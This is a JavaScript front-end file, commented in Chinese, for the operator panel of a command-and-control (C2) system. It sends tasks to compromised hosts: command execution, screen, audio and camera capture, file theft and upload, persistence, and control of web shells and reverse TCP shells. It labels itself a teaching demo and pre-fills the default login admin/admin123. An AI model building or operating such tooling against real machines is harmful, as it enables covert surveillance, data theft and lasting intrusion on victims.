// app-core.js - App 对象核心定义（constructor 属性、初始化、数据加载、登录、任务下发等核心方法）
const app = {
    page: 'login',
    clients: [],
    selectedClient: null,
    selectedClients: new Set(),
    stats: null,
    logs: [],
    tasks: [],
    payloads: [],
    groups: [],
    socket: null,
    terminalHistory: [],
    fileCurrentPath: '.',
    fileList: [],
    taskFilterStatus: '',
    taskFilterType: '',
    logFilterType: '',
    logKeyword: '',
    logSubPage: '',
    webhookConfig: null,
    mediaTab: 'screenshot',
    _debounceTimers: {},
    // 分页状态（任务列表 / 日志审计共用）
    taskPage: 1,
    taskPageSize: 20,
    logPage: 1,
    logPageSize: 20,
};

// 全局通知工具方法（支持 success/error/info/loading 四种类型）
app._notify = function(msg, type = 'success', duration = 3000) {
    const t = document.createElement('div');
    const colors = {
        success: { border: '#238636', color: '#3fb950', icon: 'fa-check-circle' },
        error: { border: '#da3633', color: '#f85149', icon: 'fa-circle-exclamation' },
        info: { border: '#1f6feb', color: '#58a6ff', icon: 'fa-info-circle' },
        loading: { border: '#d29922', color: '#d29922', icon: 'fa-spinner fa-spin' }
    };
    const c = colors[type] || colors.success;
    t.style.cssText = `position:fixed;top:60px;right:20px;background:#161b22;border:1px solid ${c.border};color:${c.color};padding:12px 20px;border-radius:8px;z-index:9999;font-size:13px;box-shadow:0 4px 20px rgba(0,0,0,0.4);min-width:200px;max-width:500px;word-break:break-all;`;
    t.innerHTML = `<i class="fas ${c.icon}"></i> ` + msg;
    t.className = 'toast-notification';
    document.body.appendChild(t);
    if (duration > 0) {
        setTimeout(() => {
            t.style.transition = 'opacity 0.3s';
            t.style.opacity = '0';
            setTimeout(() => t.remove(), 300);
        }, duration);
    }
    return t;
};

// 防抖工具
app._debounce = function(key, fn, delay = 500) {
    if (this._debounceTimers[key]) clearTimeout(this._debounceTimers[key]);
    this._debounceTimers[key] = setTimeout(fn, delay);
};

// WebShell 响应信封拆包工具
// WebShell 返回格式: {"status":"completed","result":"<内层结果>"}
// 服务端已做拆包，但前端兜底再拆一次，防止旧服务端/缓存导致信封残留
app._unwrapWebshellResult = function(result) {
    if (!result || typeof result !== 'string') return result;
    const trimmed = result.trim();
    // 检测信封特征: {"result":"...","status":"completed"}
    if (trimmed.startsWith('{') && trimmed.endsWith('}')) {
        try {
            const env = JSON.parse(trimmed);
            // 必须同时含 result 和 status 两个字段才判定为信封
            if (env && typeof env.result !== 'undefined' && typeof env.status !== 'undefined') {
                return String(env.result);
            }
        } catch(e) {
            // 不是合法 JSON，原样返回
        }
    }
    return result;
};

// 通用分页组件（参考 CS 分页器）
// 参数: total(总数), page(当前页), pageSize(每页条数), onPageChange(回调函数名)
// 返回: HTML 字符串
app.renderPagination = function(total, page, pageSize, onPageChange) {
    const totalPages = Math.max(1, Math.ceil(total / pageSize));
    const cur = Math.min(Math.max(1, page), totalPages);
    if (total === 0) return '';
    // 生成页码按钮（最多显示7个，当前页居中）
    const pages = [];
    const start = Math.max(1, cur - 3);
    const end = Math.min(totalPages, start + 6);
    const realStart = Math.max(1, end - 6);
    for (let i = realStart; i <= end; i++) pages.push(i);
    const btnStyle = 'min-width:28px; height:28px; padding:0 6px; font-size:12px; border:1px solid #21262d; background:#0d1117; color:#c9d1d9; cursor:pointer; border-radius:4px;';
    const disabledStyle = 'min-width:28px; height:28px; padding:0 6px; font-size:12px; border:1px solid #21262d; background:#0d1117; color:#c9d1d9; cursor:not-allowed; border-radius:4px; opacity:0.4;';
    const activeStyle = 'min-width:28px; height:28px; padding:0 6px; font-size:12px; border:1px solid #238636; background:#238636; color:#fff; cursor:pointer; border-radius:4px;';
    const from = (cur - 1) * pageSize + 1;
    const to = Math.min(total, cur * pageSize);
    return `
        <div style="display:flex; align-items:center; gap:4px; padding:12px; flex-wrap:wrap; border-top:1px solid #21262d;">
            <span style="font-size:11px; color:#8b949e; margin-right:8px;">${from}-${to} / ${total} 条</span>
            <button style="${cur<=1?disabledStyle:btnStyle}" ${cur<=1?'disabled':''} onclick="${onPageChange}(1)" title="首页"><i class="fas fa-angle-double-left"></i></button>
            <button style="${cur<=1?disabledStyle:btnStyle}" ${cur<=1?'disabled':''} onclick="${onPageChange}(${cur-1})" title="上一页"><i class="fas fa-angle-left"></i></button>
            ${realStart > 1 ? `<span style="color:#6e7681; font-size:12px; padding:0 2px;">…</span>` : ''}
            ${pages.map(p => `<button style="${p===cur?activeStyle:btnStyle}" onclick="${onPageChange}(${p})">${p}</button>`).join('')}
            ${end < totalPages ? `<span style="color:#6e7681; font-size:12px; padding:0 2px;">…</span>` : ''}
            <button style="${cur>=totalPages?disabledStyle:btnStyle}" ${cur>=totalPages?'disabled':''} onclick="${onPageChange}(${cur+1})" title="下一页"><i class="fas fa-angle-right"></i></button>
            <button style="${cur>=totalPages?disabledStyle:btnStyle}" ${cur>=totalPages?'disabled':''} onclick="${onPageChange}(${totalPages})" title="末页"><i class="fas fa-angle-double-right"></i></button>
            <span style="font-size:11px; color:#6e7681; margin-left:8px;">跳转</span>
            <input type="number" min="1" max="${totalPages}" value="${cur}" style="width:50px; height:28px; text-align:center; font-size:12px;" class="input" onchange="${onPageChange}(parseInt(this.value)||1)">
            <span style="font-size:11px; color:#6e7681;">/ ${totalPages} 页</span>
            <select class="select" style="height:28px; font-size:11px; margin-left:8px;" onchange="app._setPageSize(this.value)">
                <option value="20" ${pageSize===20?'selected':''}>20条/页</option>
                <option value="50" ${pageSize===50?'selected':''}>50条/页</option>
                <option value="100" ${pageSize===100?'selected':''}>100条/页</option>
                <option value="200" ${pageSize===200?'selected':''}>200条/页</option>
            </select>
        </div>
    `;
};

// 设置每页条数（根据当前页面判断更新哪个 pageSize）
app._setPageSize = function(size) {
    size = parseInt(size) || 20;
    if (this.page === 'tasks') { this.taskPageSize = size; this.taskPage = 1; }
    else if (this.page === 'logs') { this.logPageSize = size; this.logPage = 1; }
    this.render();
};

app.init = function() {
    if (API.token) {
        this.page = 'dashboard';
        this.loadAll();
        this.initSocket();
        // 初始化时打开仪表盘 Tab
        this.openTab('dashboard');
    } else {
        this.render();
    }
};

app.initSocket = function() {
    // 原生 WebSocket（替代 Socket.IO），与 Go 服务端 /ws 端点通信
    // 鉴权: 连接时携带 token（query 参数，服务端校验）
    const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
    const wsUrl = proto + '//' + location.host + '/ws?token=' + encodeURIComponent(API.token || '');

    const connect = () => {
        if (!API.token) {
            setTimeout(() => connect(), 1000);
            return;
        }
        try {
            this.socket = new WebSocket(wsUrl);
        } catch(e) {
            console.warn('[WS] 连接失败，3s 后重试:', e);
            setTimeout(() => { if (API.token) connect(); }, 3000);
            return;
        }

        this.socket.onopen = () => {
            console.log('[WS] 已连接');
        };

        this.socket.onmessage = (event) => {
            try {
                const msg = JSON.parse(event.data);
                if (msg.event === 'client_update') {
                    this._debounce('client_update', () => {
                        this.loadClientsSilent().then(() => {
                            if (this.page === 'dashboard') {
                                this.loadStats();
                            }
                            if (this.page === 'clients') {
                                this._refreshClientTable();
                            }
                        });
                    }, 1500);
                } else if (msg.event === 'task_update') {
                    this._debounce('task_update', () => {
                        this.loadTasksSilent().then(() => {
                            if (this.page === 'screenshot') {
                                const hist = document.getElementById('mediaHistoryList');
                                if (hist) hist.innerHTML = this.renderMediaHistoryItems();
                            } else if (this.page === 'tasks') {
                                this._refreshTaskTable();
                            }
                        });
                    }, 1000);
                }
            } catch(e) {
                console.warn('[WS] 消息解析失败:', e);
            }
        };

        this.socket.onclose = () => {
            console.log('[WS] 连接断开，3s 后重连...');
            this.socket = null;
            setTimeout(() => { if (API.token) connect(); }, 3000);
        };

        this.socket.onerror = () => {
            console.warn('[WS] 连接错误');
        };
    };

    connect();
};

app._debounce = function(key, fn, delay) {
    if (this._debounceTimers[key]) clearTimeout(this._debounceTimers[key]);
    this._debounceTimers[key] = setTimeout(() => {
        this._debounceTimers[key] = null;
        fn();
    }, delay);
};

app.loadClientsSilent = async function() {
    this._allClients = await API.get('/api/clients');
    this.clients = this._applyClientFilters ? this._applyClientFilters() : this._allClients;
    if (this.selectedClient) {
        const found = this._allClients.find(c => c.client_id === this.selectedClient.client_id);
        if (found) this.selectedClient = found;
    }
};

app.loadAll = async function() {
    this.loadStats();
    this.loadClients();
    this.loadTasks();
    this.loadLogs();
    this.loadPayloads();
    this.loadGroups();
    this.loadSettingsCache();
};

// 加载配置缓存（payload生成页面、内网穿透页面等从这里读取监听地址/端口/加密设置）
app.loadSettingsCache = async function() {
    try {
        this._settingsData = await API.get('/api/settings');
    } catch(e) {
        this._settingsData = null;
    }
};

app.loadStats = async function() {
    this.stats = await API.get('/api/dashboard/stats');
    this.render();
};

app.loadClients = async function() {
    this._allClients = await API.get('/api/clients');
    this.clients = this._applyClientFilters ? this._applyClientFilters() : this._allClients;
    if (this.selectedClient) {
        const found = this._allClients.find(c => c.client_id === this.selectedClient.client_id);
        if (found) this.selectedClient = found;
    }
    this.render();
};

app.loadTasks = async function() {
    this.tasks = await API.get('/api/tasks');
    this.render();
};

app.loadTasksSilent = async function() {
    this.tasks = await API.get('/api/tasks');
};

app.loadLogs = async function() {
    this.logs = await API.get('/api/logs');
    this.render();
};

app.loadPayloads = async function() {
    this.payloads = await API.get('/api/payloads');
    // 局部刷新已生成 Payload 列表，避免全量重渲染导致表单选项被重置
    if (typeof this._refreshPayloadList === 'function') {
        this._refreshPayloadList();
    } else {
        this.render();
    }
};

app.loadGroups = async function() {
    this.groups = await API.get('/api/groups');
    this.render();
};

app.login = async function(username, password) {
    if (!username) { this._notify('请输入用户名', 'error'); return; }
    if (!password) { this._notify('请输入密码', 'error'); return; }

    const btn = document.querySelector('[onclick="app.handleLogin()"]');
    if (btn) { btn.disabled = true; btn.style.opacity = '0.6'; }
    const loading = this._notify('正在登录...', 'loading', 0);

    try {
        const res = await API.post('/api/login', { username, password });
        loading.remove();
        if (btn) { btn.disabled = false; btn.style.opacity = '1'; }
        if (res.token) {
            API.token = res.token;
            localStorage.setItem('c2_token', res.token);
            this.page = 'dashboard';
            this.loadAll();
            this.initSocket();
            this.render();
            this._notify('登录成功', 'success');
        } else {
            this._notify('登录失败: ' + (res.error || '用户名或密码错误'), 'error');
        }
    } catch (e) {
        loading.remove();
        if (btn) { btn.disabled = false; btn.style.opacity = '1'; }
        this._notify('登录失败: ' + (e.message || e), 'error');
    }
};

app.logout = function() {
    API.token = '';
    localStorage.removeItem('c2_token');
    this.page = 'login';
    if (this.socket) this.socket.close();
    this.render();
};

app.sendTask = async function(taskType, taskData = {}, clientIds = null) {
    const targets = clientIds || (this.selectedClient ? [this.selectedClient.client_id] : []);
    if (targets.length === 0) {
        this._notify('请先选择目标主机', 'error');
        return;
    }

    const typeNames = {
        'cmd': '命令执行',
        'screenshot': '屏幕截图',
        'record_screen': '屏幕录像',
        'record_audio': '录音',
        'camera_photo': '摄像头拍照',
        'camera_record': '摄像头录像',
        'file_list': '文件列表',
        'file_download': '文件下载',
        'file_upload': '文件上传',
        'file_delete': '删除文件',
        'file_mkdir': '新建目录',
        'file_rename': '重命名',
        'sysinfo': '系统信息',
        'process_list': '进程列表',
        'persist': '持久化'
    };
    const taskName = typeNames[taskType] || taskType;
    const loading = this._notify(`正在执行${taskName}...`, 'loading', 0);

    // 判断是否为 WebShell 客户端（冰蝎模式：同步代理，不走异步任务队列）
    const client = this.selectedClient;
    const isWebshell = client && client.client_type === 'webshell';
    // Shell 类型（reverse_tcp raw TCP handler）：同步写入 conn + 超时读取输出
    const isShell = client && client.client_type === 'shell';

    if (isShell) {
        // Shell 同步执行模式：服务端直接向 raw TCP conn 写命令并读输出
        try {
            const resp = await API.post(`/api/shell/${targets[0]}/exec`, {
                command: taskData.command || '',
                timeout: taskData.timeout || 5
            });
            loading.remove();
            if (resp && resp.task_id) {
                this._notify(`${taskName}完成`, 'success');
                return [resp.task_id];
            }
            this._notify(`${taskName}失败`, 'error');
            return [];
        } catch (e) {
            loading.remove();
            this._notify(`${taskName}失败: ` + (e.message || e), 'error');
            return [];
        }
    }

    if (isWebshell) {
        // WebShell 同步代理模式：C2 直接向 WebShell 发 POST 请求，同步返回结果
        try {
            const resp = await API.post(`/api/webshell/${targets[0]}/exec`, {
                action: taskType,
                param: taskData
            });
            loading.remove();
            if (resp && resp.task_id) {
                this._notify(`${taskName}完成`, 'success');
                // 同步模式直接返回结果，同时也返回 task_id 供轮询兼容
                return [resp.task_id];
            }
            this._notify(`${taskName}失败`, 'error');
            return [];
        } catch (e) {
            loading.remove();
            this._notify(`${taskName}失败: ` + (e.message || e), 'error');
            return [];
        }
    }

    // 普通 Agent 客户端：异步任务队列模式
    try {
        const resp = await API.post('/api/task/send', {
            client_ids: targets,
            task_type: taskType,
            task_data: taskData
        });
        loading.remove();
        this._notify(`${taskName}任务已下发`, 'success');
        // 返回 task_ids 供调用方精确轮询任务状态
        return resp && resp.task_ids ? resp.task_ids : [];
    } catch (e) {
        loading.remove();
        this._notify('任务下发失败: ' + (e.message || e), 'error');
        return [];
    }
    // 不在此手动loadTasks，等socket推送task_update事件，避免重复请求
};

app.render = function() {
    const appEl = document.getElementById('app');
    if (this.page === 'login') {
        appEl.innerHTML = this.renderLogin();
    } else {
        appEl.innerHTML = this.renderMain();
        this.initCharts();
    }
};

app.renderLogin = function() {
    return `
                <div class="login-bg">
                    <div class="login-box">
                        <div style="text-align:center; margin-bottom:30px;">
                            <div style="font-size:48px; color:#3fb950;" class="glow-green">
                                <i class="fas fa-crosshairs"></i>
                            </div>
                            <h1 style="font-size:24px; margin-top:16px; color:#e0e6ed;">C2 控制中心</h1>
                            <p style="color:#8b949e; margin-top:8px; font-size:13px;">Command & Control System</p>
                        </div>
                        <div style="margin-bottom:16px;">
                            <label style="font-size:12px; color:#8b949e; display:block; margin-bottom:6px;">用户名</label>
                            <input type="text" id="username" class="input" placeholder="admin" value="admin" onkeypress="if(event.key==='Enter')app.handleLogin()">
                        </div>
                        <div style="margin-bottom:24px;">
                            <label style="font-size:12px; color:#8b949e; display:block; margin-bottom:6px;">密码</label>
                            <input type="password" id="password" class="input" placeholder="admin123" value="admin123" onkeypress="if(event.key==='Enter')app.handleLogin()">
                        </div>
                        <button class="btn btn-primary" style="width:100%; justify-content:center; padding:12px;" onclick="app.handleLogin()">
                            <i class="fas fa-sign-in-alt"></i> 登录系统
                        </button>
                        <p style="text-align:center; margin-top:20px; font-size:11px; color:#484f58;">
                            演示系统 | 仅供教学使用
                        </p>
                    </div>
                </div>
            `;
};

app.handleLogin = function() {
    const u = document.getElementById('username').value;
    const p = document.getElementById('password').value;
    this.login(u, p);
};
